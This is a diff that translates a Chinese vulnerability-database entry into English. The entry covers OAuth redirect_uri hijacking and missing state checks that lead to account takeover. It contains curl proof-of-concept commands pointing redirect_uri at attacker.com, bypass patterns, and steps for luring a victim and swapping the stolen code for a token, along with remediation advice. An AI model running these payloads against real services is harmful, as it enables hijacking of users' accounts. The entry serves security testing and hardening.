@@ -1,59 +1,59 @@
 ﻿---
-title: OAuth redirect_uri 劫持 / state 缺失（账号接管）
-cve: 无（实现缺陷）
+title: OAuth redirect_uri hijacking / missing state (account takeover)
+cve: None (implementation flaw)
 severity: high
 cvss: 8.6
-product: 自研三方登录（Google/微信/Telegram）
-versions: 任意
+product: Custom third-party login (Google/WeChat/Telegram)
+versions: Any
 ports: 80, 443
-keywords: oauth, redirect_uri, state, 登录, 接管, sso
-entry: /oauth/authorize?redirect_uri= 可篡改
+keywords: oauth, redirect_uri, state, login, takeover, sso
+entry: Tamperable /oauth/authorize?redirect_uri=
 verified: false
-sources: 公开资料整理（实现缺陷类）
+sources: Compiled from public sources (implementation flaws)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 GET /oauth/authorize?client_id=..&redirect_uri=..&response_type=code
-回调页 /oauth/callback?code=
+Callback page /oauth/callback?code=
 ```
 
-## 前置条件
+## Prerequisites
 
-- 回调域名校验不严（前缀/后缀/子域/开放重定向）。
+- Insufficient callback-domain validation (prefix/suffix/subdomain/open redirect).
 
 ## PoC
 
 ```bash
-# 1) 改回调到攻击者域
+# 1) Change the callback to the attacker's domain
 curl -s -D- -o /dev/null 'https://target/oauth/authorize?client_id=web&redirect_uri=https://attacker.com/cb&response_type=code&state=x' \
   | grep -i location
-# Location 里带 attacker.com 且 code= = 命中
+# Confirmation: Location contains attacker.com and code=
 
-# 2) 子域/后缀绕过
+# 2) Subdomain/suffix bypasses
 #   https://target.com.attacker.com
 #   https://attacker.com/target.com
 #   https://target.com@attacker.com
-# 3) 用站内开放重定向做跳板（/jump?url=）
+# 3) Use an on-site open redirect as a stepping stone (/jump?url=)
 curl -s -D- -o /dev/null 'https://target/oauth/authorize?client_id=web&redirect_uri=https://target/jump?url=https://attacker.com&response_type=code'
 ```
 
 ```bash
-# 4) 另测 state 缺失：去掉 state 看是否仍接受（可 CSRF 绑定攻击者账号）
+# 4) Separately test missing state: remove state and check whether it is still accepted (CSRF can link the attacker's account)
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先测严格匹配是否被绕过（只读看 Location）；
-2. 命中后诱导受害者点链接，code 落到攻击者；
-3. 用 code 换 token → 接管；
-4. 证据：Location 头 + code 落地记录。
+1. First test whether exact matching can be bypassed (read-only inspection of Location);
+2. If successful, induce the victim to click the link so the attacker receives the code;
+3. Exchange the code for a token → takeover;
+4. Evidence: the Location header + records of the received code.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- redirect_uri 白名单精确匹配；强制 state 且一次性校验；code 绑定 PKCE。
+- Require exact matching against the redirect_uri allowlist; require state and validate it once only; bind the code to PKCE.
 
-## 参考
+## References
 
-- OAuth 2.0 安全最佳实践；CWE-601。
+- OAuth 2.0 security best practices; CWE-601.
